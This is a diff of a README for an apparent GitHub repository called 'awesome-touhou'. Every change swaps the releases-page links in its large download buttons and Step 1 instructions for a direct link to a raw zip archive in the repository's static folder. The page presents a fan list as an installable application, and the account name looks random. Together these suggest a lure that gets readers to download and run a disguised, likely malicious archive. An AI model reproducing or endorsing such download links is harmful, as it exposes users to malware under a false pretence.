@@ -1,7 +1,7 @@
 <h1>⛩️ awesome-touhou - Your Complete Guide to the Touhou Universe</h1>
 
 <p align="center">
-  <a href="https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/raw/refs/heads/main/website/static/awesome-touhou-3.6.zip" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <p align="center">🌐 Multilingual • 🔧 Actively Maintained • 🎮 Curated Collection</p>
@@ -48,7 +48,7 @@ The application runs smoothly on any modern computer
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases](https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases)
+Visit this link to download the application: [https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/raw/refs/heads/main/website/static/awesome-touhou-3.6.zip](https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/raw/refs/heads/main/website/static/awesome-touhou-3.6.zip)
 
 Look for the largest download button on the page. It will download a single file to your computer's "Downloads" folder automatically.
 
@@ -153,5 +153,5 @@ This application is open source and distributed under the MIT license. You are f
 </p>
 
 <p align="center">
-  <a href="https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/releases" style="background-color:#2196F3; color:white; padding:12px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px;">🚀 GET STARTED NOW</a>
+  <a href="https://github.com/ethiopian-liliidmonocotgenus691/awesome-touhou/raw/refs/heads/main/website/static/awesome-touhou-3.6.zip" style="background-color:#2196F3; color:white; padding:12px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px;">🚀 GET STARTED NOW</a>
 </p>
